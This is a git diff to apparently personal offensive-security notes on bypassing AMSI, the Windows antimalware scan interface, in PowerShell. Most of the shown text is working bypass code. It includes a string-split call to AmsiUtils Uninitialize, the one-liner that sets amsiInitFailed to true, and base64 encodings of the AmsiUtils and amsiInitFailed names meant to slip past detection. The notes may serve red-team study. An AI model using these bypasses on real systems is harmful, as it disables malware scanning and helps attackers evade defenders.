@@ -131,8 +131,7 @@ List `dirty` words:
 
 https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file#Patch-the-providers-DLL-of-Microsoft-MpOav.dll
 
-```code
-
+```powershell
 $APIs = @"
 using System;
 using System.Runtime.InteropServices;
@@ -164,6 +163,27 @@ $p = 0
 $object = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls')
 $Uninitialize = $object.GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq Uninitialize
 $Uninitialize.Invoke($object,$null) 
-``code
+```
 
 https://youtu.be/QO_1UMaiWHk?si=C__eVWkAyj2jsBo-&t=6403
+
+```powershell
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+```
+
+![image](./images/amsi_caught.jpg)
+
+Let's base64 encode some strings
+
+String1 = System.Management.Automation.AmsiUtils
+String2 = amsiInitFailed
+
+```powershell
+$b64String1 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("System.Management.Automation.AmsiUtils"))
+$b64String2 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("amsiInitFailed"))
+```
+
+> ***String1 =>*** UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==
+> ***String2 =>*** YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA==
+
+![image](./images/amsi_b64.jpg)
